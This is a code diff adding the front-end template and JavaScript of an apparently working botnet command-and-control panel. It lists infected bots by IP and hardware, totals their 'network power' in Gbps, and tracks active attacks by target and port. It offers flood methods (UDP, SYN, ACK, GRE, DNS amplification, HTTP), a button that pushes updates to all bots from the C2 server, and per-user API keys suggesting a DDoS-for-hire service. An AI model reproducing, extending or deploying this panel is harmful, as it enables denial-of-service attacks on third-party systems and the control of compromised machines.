+                        <p class="text-sm text-discord-dim mb-4">Force all bots to update from C2 server</p>
+                        <button onclick="sendBotCommand('!update')" class="w-full discord-btn py-2 px-4 rounded-md">
+                            <i class="fas fa-cloud-download-alt mr-2"></i> Push Update
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="stats-content" class="tab-content hidden p-6 custom-scrollbar" style="max-height: 60vh; overflow-y: auto;">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <div class="glass-panel p-4 rounded-md">
+                        <h3 class="font-medium mb-4 flex items-center gap-2">
+                            <i class="fas fa-microchip"></i>
+                            Bot Hardware Stats
+                        </h3>
+                        <div class="space-y-3">
+                            <div>
+                                <div class="flex justify-between text-sm mb-1">
+                                    <span class="text-discord-dim">Average CPU Cores</span>
+                                    <span id="avg-cores" class="text-discord-primary">-</span>
+                                </div>
+                                <div class="h-1 bg-discord-dark rounded-full overflow-hidden">
+                                    <div id="cores-bar" class="h-full bg-discord-primary" style="width: 0%"></div>
+                                </div>
+                            </div>
+                            <div>
+                                <div class="flex justify-between text-sm mb-1">
+                                    <span class="text-discord-dim">Average RAM (GB)</span>
+                                    <span id="avg-ram" class="text-discord-primary">-</span>
+                                </div>
+                                <div class="h-1 bg-discord-dark rounded-full overflow-hidden">
+                                    <div id="ram-bar" class="h-full bg-discord-primary" style="width: 0%"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="glass-panel p-4 rounded-md">
+                        <h3 class="font-medium mb-4 flex items-center gap-2">
+                            <i class="fas fa-chart-line"></i>
+                            Network Stats
+                        </h3>
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <div class="text-sm text-discord-dim">Total Power</div>
+                                <div class="text-xl font-bold" id="total-power">0.00 Gbps</div>
+                            </div>
+                            <div>
+                                <div class="text-sm text-discord-dim">Bots Online</div>
+                                <div class="text-xl font-bold" id="online-bots">0</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="glass-panel p-4 rounded-md md:col-span-2">
+                        <h3 class="font-medium mb-4 flex items-center gap-2">
+                            <i class="fas fa-bolt"></i>
+                            Attack Statistics
+                        </h3>
+                        <div class="grid grid-cols-3 gap-4">
+                            <div class="text-center">
+                                <div class="text-sm text-discord-dim">Today</div>
+                                <div class="text-xl font-bold" id="total-attacks">0</div>
+                            </div>
+                            <div class="text-center">
+                                <div class="text-sm text-discord-dim">Top Method</div>
+                                <div class="text-xl font-bold" id="top-method">-</div>
+                            </div>
+                            <div class="text-center">
+                                <div class="text-sm text-discord-dim">Avg Duration</div>
+                                <div class="text-xl font-bold" id="avg-duration">0s</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="api-content" class="tab-content hidden p-6 custom-scrollbar" style="max-height: 60vh; overflow-y: auto;">
+                <div class="space-y-6">
+                    <div>
+                        <h3 class="text-md font-medium mb-3">API Key Management</h3>
+                        <div class="bg-discord-dark rounded-md p-4">
+                            <p class="text-sm text-discord-dim mb-3">Manage API keys for all users</p>
+                            <table class="w-full text-sm">
+                                <thead>
+                                    <tr class="text-left text-discord-dim border-b border-discord-dark">
+                                        <th class="pb-2 pr-4">Username</th>
+                                        <th class="pb-2 pr-4">Level</th>
+                                        <th class="pb-2">API Key</th>
+                                        <th class="pb-2">Action</th>
+                                    </tr>
+                                </thead>
+                                <tbody class="divide-y divide-discord-dark">
+                                    {{range .Users}}
+                                    <tr class="hover:bg-discord-dark/50">
+                                        <td class="py-3 pr-4">{{.Username}}</td>
+                                        <td class="py-3 pr-4">
+                                            {{if eq .Level "Owner"}}
+                                            <span class="badge badge-primary">Owner</span>
+                                            {{else if eq .Level "Admin"}}
+                                            <span class="badge badge-success">Admin</span>
+                                            {{else}}
+                                            <span class="badge">User</span>
+                                            {{end}}
+                                        </td>
+                                        <td class="py-3 pr-4">
+                                            <div class="api-key truncate">{{.APIKey}}</div>
+                                        </td>
+                                        <td class="py-3">
+                                            <button onclick="regenerateUserApiKey('{{.Username}}')" class="discord-btn py-1 px-2 rounded text-xs">
+                                                <i class="fas fa-sync-alt mr-1"></i> Regenerate
+                                            </button>
+                                        </td>
+                                    </tr>
+                                    {{end}}
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="user-settings-overlay" class="fixed inset-0 bg-black/80 z-50 flex items-center justify-center hidden">
+        <div class="bg-discord-darker rounded-lg w-full max-w-md max-h-[90vh] overflow-hidden">
+            <div class="px-6 py-4 border-b border-discord-dark flex justify-between items-center">
+                <h2 class="text-lg font-semibold flex items-center gap-2">
+                    <i class="fas fa-cog text-discord-primary"></i>
+                    User Settings
+                </h2>
+                <button onclick="hideUserSettings()" class="text-discord-dim hover:text-discord-primary transition-colors">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            
+            <div class="p-6 space-y-6 custom-scrollbar" style="max-height: 60vh; overflow-y: auto;">
+                <div>
+                    <h3 class="text-md font-medium mb-3">Change Password</h3>
+                    <form id="password-form" class="space-y-3">
+                        <div>
+                            <label class="block text-sm metric-label mb-1">Current Password</label>
+                            <input type="password" id="current-password" class="w-full bg-discord-dark border border-discord-dark rounded-md h-10 px-3 text-discord-text focus:border-discord-primary focus:ring-1 focus:ring-discord-primary outline-none">
+                        </div>
+                        <div>
+                            <label class="block text-sm metric-label mb-1">New Password</label>
+                            <input type="password" id="new-password" class="w-full bg-discord-dark border border-discord-dark rounded-md h-10 px-3 text-discord-text focus:border-discord-primary focus:ring-1 focus:ring-discord-primary outline-none">
+                        </div>
+                        <div>
+                            <label class="block text-sm metric-label mb-1">Confirm Password</label>
+                            <input type="password" id="confirm-password" class="w-full bg-discord-dark border border-discord-dark rounded-md h-10 px-3 text-discord-text focus:border-discord-primary focus:ring-1 focus:ring-discord-primary outline-none">
+                        </div>
+                        <button type="button" onclick="changePassword()" class="w-full discord-btn py-2 rounded-md mt-2">
+                            <i class="fas fa-key mr-2"></i> Update Password
+                        </button>
+                    </form>
+                </div>
+                
+                <div>
+                    <h3 class="text-md font-medium mb-3">API Key</h3>
+                    <div class="api-key mb-3">{{.User.APIKey}}</div>
+                    <button onclick="regenerateApiKey()" class="w-full discord-btn py-2 rounded-md">
+                        <i class="fas fa-sync-alt mr-2"></i> Regenerate Key
+                    </button>
+                    <p class="text-xs text-discord-dim mt-2">Warning: Regenerating will invalidate the current key</p>
+                </div>
+                
+                <div>
+                    <h3 class="text-md font-medium mb-3">Danger Zone</h3>
+                    <button onclick="deleteAccount()" class="w-full discord-btn discord-btn-danger py-2 rounded-md">
+                        <i class="fas fa-trash-alt mr-2"></i> Delete Account
+                    </button>
+                    <p class="text-xs text-discord-dim mt-2">This action cannot be undone</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let eventSource;
+        let reconnectAttempts = 0;
+        const maxReconnectAttempts = 5;
+        const reconnectDelay = 1000;
+
+        function connectSSE() {
+            eventSource = new EventSource('/events');
+            
+            eventSource.onopen = () => {
+                reconnectAttempts = 0;
+            };
+            
+            eventSource.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+                    updateDashboard(data);
+                } catch (e) {
+                    console.error('Error parsing SSE data:', e);
+                }
+            };
+            
+            eventSource.onerror = () => {
+                eventSource.close();
+                if (reconnectAttempts < maxReconnectAttempts) {
+                    setTimeout(connectSSE, reconnectDelay * Math.pow(2, reconnectAttempts));
+                    reconnectAttempts++;
+                }
+            };
+        }
+
+        function updateDashboard(data) {
+            if (!data) return;
+
+            document.getElementById('bot-count').textContent = data.botCount;
+            document.getElementById('bot-count-text').textContent = data.botCount;
+            document.getElementById('active-attacks-count').textContent = `${data.activeAttacks}/${data.attacks.length}`;
+            document.getElementById('online-bots').textContent = data.botCount;
+            
+            const totalPower = calculateNetworkPower(data.bots);
+            document.getElementById('total-power').textContent = `${totalPower.toFixed(2)} Gbps`;
+            document.getElementById('network-power').textContent = `${totalPower.toFixed(2)} Gbps`;
+            
+            updateAttacksTable(data.attacks);
+            updateBotsTable(data.bots);
+            updateStats(data);
+        }
+
+        function calculateNetworkPower(bots) {
+            if (!bots || !bots.length) return 0;
+            
+            let totalPower = 0;
+            bots.forEach(bot => {
+                const botPower = (bot.Cores || 1) * (bot.RAM || 1) * 0.1;
+                totalPower += botPower;
+            });
+            
+            return totalPower;
+        }
+
+        function updateAttacksTable(attacks) {
+            const container = document.getElementById('attacks-container');
+            if (!container) return;
+            
+            if (!attacks || attacks.length === 0) {
+                container.innerHTML = `
+                    <div class="text-center py-8 text-discord-dim">
+                        <i class="fas fa-cloud text-4xl mb-2"></i>
+                        <p>No active attacks</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            let html = '';
+            attacks.forEach(attack => {
+                html += `
+                    <div class="bg-discord-dark rounded-md p-3 flex justify-between items-center">
+                        <div>
+                            <div class="flex items-center gap-2">
+                                <span class="attack-method">
+                                    ${methodIcon(attack.Method)} ${methodName(attack.Method)}
+                                </span>
+                                <span class="text-xs text-discord-dim">${attack.Remaining} left</span>
+                            </div>
+                            <div class="font-mono text-sm mt-1">${attack.Target}:${attack.Port}</div>
+                        </div>
+                        <a href="/stop-attack?id=${attack.ID}" class="discord-btn discord-btn-danger py-1 px-2 rounded text-sm">
+                            <i class="fas fa-stop"></i>
+                        </a>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+        }
+
+        function updateBotsTable(bots) {
+            const container = document.getElementById('bots-container');
+            if (!container) return;
+            
+            if (!bots || bots.length === 0) {
+                container.innerHTML = `
+                    <div class="text-center py-8 text-discord-dim">
+                        <i class="fas fa-robot text-4xl mb-2"></i>
+                        <p>No bots connected</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            let html = '';
+            bots.forEach(bot => {
+                const isOnline = new Date(bot.LastHeartbeat) > new Date(Date.now() - 120000);
+                const lastSeen = new Date(bot.Time).toLocaleTimeString();
+                
+                html += `
+                    <div class="bg-discord-dark rounded-md p-3 flex justify-between items-center bot-row" data-bot='${JSON.stringify(bot)}'>
+                        <div>
+                            <div class="flex items-center gap-2">
+                                <span class="status-indicator ${isOnline ? 'status-active' : 'status-inactive'}"></span>
+                                <span class="font-mono text-sm">${bot.IP}</span>
+                            </div>
+                            <div class="text-xs text-discord-dim mt-1 flex items-center gap-2">
+                                <span>${bot.Arch || 'unknown'}</span>
+                                <span>•</span>
+                                <span>${bot.Cores || 0} cores</span>
+                                <span>•</span>
+                                <span>${bot.RAM ? bot.RAM.toFixed(1) : 0}GB RAM</span>
+                            </div>
+                        </div>
+                        <div class="text-xs text-discord-dim">
+                            ${lastSeen}
+                        </div>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+        }
+
+        function updateStats(data) {
+            if (!data.bots) return;
+
+            let totalCores = 0;
+            let totalRAM = 0;
+            let activeBots = 0;
+            
+            data.bots.forEach(bot => {
+                if (new Date(bot.LastHeartbeat) > new Date(Date.now() - 120000)) {
+                    totalCores += bot.Cores || 0;
+                    totalRAM += bot.RAM || 0;
+                    activeBots++;
+                }
+            });
+            
+            const avgCores = activeBots > 0 ? (totalCores / activeBots).toFixed(1) : 0;
+            const avgRAM = activeBots > 0 ? (totalRAM / activeBots).toFixed(1) : 0;
+            
+            document.getElementById('avg-cores').textContent = avgCores;
+            document.getElementById('avg-ram').textContent = avgRAM;
+            document.getElementById('cores-bar').style.width = `${(avgCores / 16) * 100}%`;
+            document.getElementById('ram-bar').style.width = `${(avgRAM / 32) * 100}%`;
+            
+            if (data.attacks && data.attacks.length > 0) {
+                const methodCounts = {};
+                let totalDuration = 0;
+                
+                data.attacks.forEach(attack => {
+                    methodCounts[attack.Method] = (methodCounts[attack.Method] || 0) + 1;
+                    totalDuration += parseInt(attack.Duration) || 0;
+                });
+                
+                const topMethod = Object.entries(methodCounts).sort((a, b) => b[1] - a[1])[0]?.[0] || '-';
+                const avgDuration = Math.round(totalDuration / data.attacks.length);
+                
+                document.getElementById('total-attacks').textContent = data.attacks.length;
+                document.getElementById('top-method').textContent = methodName(topMethod);
+                document.getElementById('avg-duration').textContent = `${avgDuration}s`;
+            } else {
+                document.getElementById('total-attacks').textContent = '0';
+                document.getElementById('top-method').textContent = '-';
+                document.getElementById('avg-duration').textContent = '0s';
+            }
+        }
+
+        function methodIcon(method) {
+            const icons = {
+                '!udpflood': '<i class="fas fa-bolt"></i>',
+                '!udpsmart': '<i class="fas fa-brain"></i>',
+                '!tcpflood': '<i class="fas fa-network-wired"></i>',
+                '!synflood': '<i class="fas fa-sync"></i>',
+                '!ackflood': '<i class="fas fa-reply"></i>',
+                '!greflood': '<i class="fas fa-project-diagram"></i>',
+                '!dns': '<i class="fas fa-server"></i>',
+                '!http': '<i class="fas fa-globe"></i>'
+            };
+            return icons[method] || '';
+        }
+
+        function methodName(method) {
+            const names = {
+                '!udpflood': 'UDP Flood',
+                '!udpsmart': 'UDP Smart',
+                '!tcpflood': 'TCP Flood',
+                '!synflood': 'SYN Flood',
+                '!ackflood': 'ACK Flood',
+                '!greflood': 'GRE Flood',
+                '!dns': 'DNS Amplification',
+                '!http': 'HTTP Flood'
+            };
+            return names[method] || method;
+        }
+
+        function showAdminPanel() {
+            document.getElementById('admin-overlay').classList.remove('hidden');
+            switchTab('users');
+        }
+
+        function hideAdminPanel() {
+            document.getElementById('admin-overlay').classList.add('hidden');
+        }
+
+        function showUserSettings() {
+            document.getElementById('user-settings-overlay').classList.remove('hidden');
+        }
+
+        function hideUserSettings() {
+            document.getElementById('user-settings-overlay').classList.add('hidden');
+        }
+
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.add('hidden');
+            });
+            document.querySelectorAll('.tab-button').forEach(button => {
+                button.classList.remove('active');
+            });
+
+            document.getElementById(`${tabName}-content`).classList.remove('hidden');
+            document.getElementById(`${tabName}-tab`).classList.add('active');
+        }
+
+        function showAddUserForm() {
+            document.getElementById('add-user-form').classList.remove('hidden');
+        }
+
+        function hideAddUserForm() {
+            document.getElementById('add-user-form').classList.add('hidden');
+        }
+
+        function togglePasswordVisibility(inputId) {
+            const input = document.getElementById(inputId);
+            const icon = input.nextElementSibling.querySelector('i');
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                input.type = 'password';
+                icon.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        }
+
+        function stopAllAttacks() {
+            if (!confirm('Are you sure you want to stop all active attacks?')) return;
+            
+            fetch('/stop-all-attacks', {
+                method: 'POST',
+                credentials: 'same-origin'
+            }).then(response => {
+                if (response.ok) {
+                    return response.text();
+                }
+                throw new Error('Failed to stop attacks');
+            }).then(message => {
+                alert(message);
+                location.reload();
+            }).catch(error => {
+                alert(`Error: ${error.message}`);
+            });
+        }
+
+        function sendBotCommand(command) {
+            if (!confirm(`Execute "${command}" on all bots?`)) return;
+            
+            fetch('/admin-command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `command=${encodeURIComponent(command)}`,
+                credentials: 'same-origin'
+            }).then(response => {
+                if (response.ok) {
+                    return response.text();
+                }
+                throw new Error('Command failed');
+            }).then(message => {
+                alert(message);
+            }).catch(error => {
+                alert(`Error: ${error.message}`);
+            });
+        }
+
+        function regenerateApiKey() {
+            if (!confirm('Are you sure you want to regenerate your API key? This will invalidate the current key.')) return;
+            
+            fetch('/api/generate-key', {
+                method: 'POST',
+                credentials: 'same-origin'
+            }).then(response => {
+                if (response.ok) {
+                    return response.json();
+                }
+                throw new Error('Failed to regenerate key');
+            }).then(data => {
+                document.querySelectorAll('.api-key').forEach(el => {
+                    if (el.textContent === '{{.User.APIKey}}') {
+                        el.textContent = data.APIKey;
+                    }
+                });
+                alert('API key regenerated successfully');
+            }).catch(error => {
+                alert(`Error: ${error.message}`);
+            });
+        }
+
+        function regenerateUserApiKey(username) {
+            if (!confirm(`Are you sure you want to regenerate API key for ${username}?`)) return;
+            
+            fetch('/api/generate-key', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ username: username }),
+                credentials: 'same-origin'
+            }).then(response => {
+                if (response.ok) {
+                    return response.json();
+                }
+                throw new Error('Failed to regenerate key');
+            }).then(data => {
+                alert(`API key for ${username} regenerated successfully`);
+                location.reload();
+            }).catch(error => {
+                alert(`Error: ${error.message}`);
+            });
+        }
+
+        function changePassword() {
+            const currentPassword = document.getElementById('current-password').value;
+            const newPassword = document.getElementById('new-password').value;
+            const confirmPassword = document.getElementById('confirm-password').value;
+            
+            if (newPassword !== confirmPassword) {
+                alert('New passwords do not match');
+                return;
+            }
+            
+            if (newPassword.length < 12) {
+                alert('Password must be at least 12 characters');
+                return;
+            }
+            
+            fetch('/change-password', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    currentPassword: currentPassword,
+                    newPassword: newPassword
+                }),
+                credentials: 'same-origin'
+            }).then(response => {
+                if (response.ok) {
+                    return response.json();
+                }
+                throw new Error('Password change failed');
+            }).then(data => {
+                alert(data.message || 'Password changed successfully');
+                hideUserSettings();
+            }).catch(error => {
+                alert(`Error: ${error.message}`);
+            });
+        }
+
+        function deleteAccount() {
+            if (!confirm('Are you absolutely sure you want to delete your account? This cannot be undone.')) return;
+            
+            fetch('/delete-account', {
+                method: 'POST',
+                credentials: 'same-origin'
+            }).then(response => {
+                if (response.ok) {
+                    return response.json();
+                }
+                throw new Error('Account deletion failed');
+            }).then(data => {
+                alert(data.message || 'Account deleted successfully');
+                window.location.href = '/logout';
+            }).catch(error => {
+                alert(`Error: ${error.message}`);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            connectSSE();
+            
+            document.getElementById('profile-button').addEventListener('click', function(e) {
+                e.stopPropagation();
+                document.getElementById('profile-dropdown').classList.toggle('hidden');
+            });
+
+            document.addEventListener('click', function() {
+                document.getElementById('profile-dropdown').classList.add('hidden');
+            });
+
+            document.getElementById('new-password')?.addEventListener('input', function(e) {
+                const password = e.target.value;
+                const checks = {
+                    'length-check': password.length >= 12,
+                    'case-check': /[a-z]/.test(password) && /[A-Z]/.test(password),
+                    'number-check': /\d/.test(password),
+                    'special-check': /[!@#$%^&*]/.test(password)
+                };
+                
+                Object.entries(checks).forEach(([id, isValid]) => {
+                    const icon = document.getElementById(id);
+                    icon.style.color = isValid ? '#5865f2' : '#949ba4';
+                    icon.classList.toggle('fa-check-circle', isValid);
+                    icon.classList.toggle('fa-times-circle', !isValid);
+                });
+            });
+
+            document.getElementById('user-form')?.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const formData = new FormData(this);
+                
+                fetch('/add-user', {
+                    method: 'POST',
+                    body: formData,
+                    credentials: 'same-origin'
+                }).then(response => {
+                    if (response.ok) {
+                        return response.json();
+                    }
+                    throw new Error('User creation failed');
+                }).then(data => {
+                    alert(data.message || 'User created successfully');
+                    location.reload();
+                }).catch(error => {
+                    alert(`Error: ${error.message}`);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
